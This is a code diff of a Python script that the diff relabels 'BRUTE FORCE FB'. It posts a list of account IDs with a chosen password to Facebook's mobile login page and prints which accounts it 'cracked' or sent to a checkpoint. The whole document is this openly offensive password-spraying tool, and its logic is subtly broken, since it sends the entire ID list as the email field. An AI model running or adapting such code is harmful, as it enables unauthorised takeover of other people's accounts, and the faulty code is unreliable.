@@ -10,25 +10,26 @@ def keyboardInterruptHandler(signal, frame):
     print("KeyboardInterrupt (ID: %s)" % (signal,))
     exit(0)
 signal.signal(signal.SIGINT, keyboardInterruptHandler)
-async def kamuuu(id, gans):
-    ru = {'email':id,'pass':gans,'login':'submit'}
+async def kamuuu(gans, pw):
+    ru = {'email':gans,'pass':pw,'login':'submit'}
     agent = {'User-agent': 'Mozilla/5.0'}
     rz = post("https://free.facebook.com/login", ru, agent)
     if 'm_ses' in rz.url or 'save-device' in rz.url:
-        print (f"%s [+] LOGIN BERHASIL" % (color,))
+        print (f"%s[+] BERHASIL CRACK -> {wordlist}|{pw}" % (color,))
     elif 'checkpoint' in rz.url:
-         print ('CP')
+         print (f'[-] CHECKPOINT -> {wordlist}')
     else:
          print (f'{color4}[+] GAGAL -> {wordlist}')
 if __name__ == '__main__':
   os.system("clear")
   print (f""" {color3}
          [ CREATE BY WIDHISEC ]
+         [ BRUTE FORCE FB     ]
                """)
-  id = input(str("{}email : ").format(color2))
-  j = input("wordlist :")
-  with open(j) as f:
+  gan = input(str("list id : "))
+  pw = input("crack pw :")
+  with open(gan) as f:
     gans = f.read().splitlines()
   for wordlist in gans:
       loop = asyncio.get_event_loop()
-      loop.run_until_complete(kamuuu(id,gans))
+      loop.run_until_complete(kamuuu(gans,pw))
